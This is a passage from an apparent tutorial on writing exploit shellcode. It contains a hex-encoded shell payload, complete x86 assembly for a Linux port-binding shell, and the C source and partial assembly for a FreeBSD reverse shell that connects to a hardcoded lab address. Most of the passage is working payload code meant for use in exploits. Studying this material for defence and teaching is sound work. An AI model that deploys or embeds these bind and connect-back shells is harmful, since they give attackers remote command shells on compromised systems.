&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x50\xcd\x80\xe8\x91\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";</pre>

<h2>
<u>The Linux port binding shellcode:</u></h2>

<pre>Linux socket code is a bit different then the BSD one. The problem is that linux
has one socket system call that can be used to query other socket functions (an API)
This system call is called 'socketcall' and is executed with two arguments. The first
argument is a number that represent a socket function (such as listen()). The second
argument is a pointer to an array that contains the argument that have to be given to&nbsp;
the by the first argument defined function.. ;-) Not very useful for shellcode development.</pre>

<pre>Socketcall is called like this:</pre>

<pre>socketcall(&lt;function number&gt;,&lt;arguments for that function&gt;)</pre>

<pre>Below are the available function numbers:</pre>

<pre>SYS_SOCKET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1
SYS_BIND&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2
SYS_CONNECT&nbsp;&nbsp;&nbsp;&nbsp; 3
SYS_LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4
SYS_ACCEPT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5
SYS_GETSOCKNAME 6
SYS_GETPEERNAME 7
SYS_SOCKETPAIR&nbsp; 8
SYS_SEND&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 9
SYS_RECV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10
SYS_SENDTO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11
SYS_RECVFROM&nbsp;&nbsp;&nbsp; 12
SYS_SHUTDOWN&nbsp;&nbsp;&nbsp; 13
SYS_SETSOCKOPT&nbsp; 14
SYS_GETSOCKOPT&nbsp; 15
SYS_SENDMSG&nbsp;&nbsp;&nbsp;&nbsp; 16
SYS_RECVMSG&nbsp;&nbsp;&nbsp;&nbsp; 17</pre>

<pre>And ofcourse the implementation:</pre>

<pre>BITS 32

xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; NULL eax
inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; eax represents 1 now&nbsp;
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi +12],eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx,eax
inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi +8],eax
add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,0x04
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi +16],eax
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx,[esi +8]
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,102&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; 102 == socketcall
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; call the kernel
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; store the file descriptor in edx&nbsp;
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Null eax
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Now lets make the&nbsp; serv_addr struct&nbsp;&nbsp;
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 8],0x02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; This equals: serv_addr.sin_family=2
mov word&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 10],0xAAAA&nbsp;&nbsp;&nbsp;&nbsp; ; This equals: serv_addr.sin_port=0xAAAA
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 12],eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; This equals: serv_addr.sin_addr.s_addr=0
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 17],edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; edx the file descriptor
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx,[esi + 8]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; load effective address of the struct
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 21],ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; and store it in [esi + 21]
inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx,ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cl,14
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 25],ecx
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx,[esi +17]
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,102
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,102
inc ebx
inc ebx
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax
inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 21],eax
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 25],eax
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,102
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Save the file descriptor in ebx
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; NULL eax
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 12], eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; 0 == stdin&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,63&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; dub2()
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Call kernel
inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; 1 == stdout&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,63&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; dub2()
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Call kernel&nbsp;
inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; 2 == stderr
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,63&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; dub2()
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Call kernel&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; From here it is just a matter of&nbsp;&nbsp;&nbsp;
jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; executing a shell (/bin/bash)

doit:

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 9], al
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, [esi]
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 11], ebx
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 15], eax
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 0x0b
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, esi
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx, [esi + 11]
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx, [esi + 15]
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80

callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/bin/bash'

</pre>

<h2>
<u>FreeBSD connecting shellcode:</u></h2>

<pre>In this example we will see how to create shellcode that creates a shell, which connects
back to a host you control. You'll be able to catch the shell by using a tool such as netcat.
In this shellcode you will have to hardcode an IP address to connect to. It is also possible
to add this ip address at the runtime of the exploit (which is a good idea). Please remember&nbsp;
to convert the IP address ! for testing puposes the assembly and shellcode below will connect
to 10.6.12.33 (an machine in my tiny test lab) on port 43690. Within the code this IP address&nbsp;
is converted to: 0x210c060a . You can obtain this hex value pretty easily with perl:

su-2.05a# perl -e 'printf "0x" . "%02x"x4 ."\n",33,12,6,10'
0x210c060a</pre>

<pre>Just make sure you reverse the IP address like I did with 10.6.12.33. The C code on which the
assembly is based:</pre>

<pre>#include&lt;unistd.h&gt;
#include&lt;sys/socket.h&gt;
#include&lt;netinet/in.h&gt;

int soc,rc;
struct sockaddr_in serv_addr;

int main()
{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; serv_addr.sin_family=2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; serv_addr.sin_addr.s_addr=0x210c060a;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; serv_addr.sin_port=0xAAAA; /* port 43690 */
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; soc=socket(2,1,6);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rc = connect(soc, (struct sockaddr *)&amp;serv_addr,0x10);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dup2(soc,0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dup2(soc,1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dup2(soc,2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; execve("/bin/sh",0,0);
}</pre>

<pre>And the assembly implementation:</pre>

<pre>BITS 32

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit
doit:

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 7], al
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Next code: socket(2,1,6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x06&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The 3e argument&nbsp;&nbsp;&nbsp;
push byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The 2e argument&nbsp;
push byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The 1e argument&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,97&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The system call number
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And call the kernel&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Next code: connect(soc,(struct sockaddr *)&amp;serv_addr,0x10);
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We store the file descriptor that was returned from socket() in edx
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Now we will create the sockaddr_in structure
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 9],0x02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; This equals: serv_addr.sin_family=2
mov word&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 10],0xAAAA&nbsp;&nbsp;&nbsp;&nbsp; ; This equals: serv_addr.sin_port=0xAAAA&nbsp; /* port 43690 */
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 12],0x210c060a ; This equals: serv_addr.sin_addr.s_addr=0x210c060a
push byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We now start with pushing the arguments, 0x10 is the 3e one.&nbsp;&nbsp;&nbsp;
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,[esi + 8]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Get the address of our structure, arg 2 of bind() is a pointer.
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And push it on the stack, our second argument is a fact
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And we push the last argument, the file descriptor, on the stack
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Clean up
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,98&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; System call 98 represents connect.
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And call the kernel
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Next code: dup2(cli,0) , dup2(cli,1) and dup2(cli,2)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We will do this in a loop since this creates smaller code.
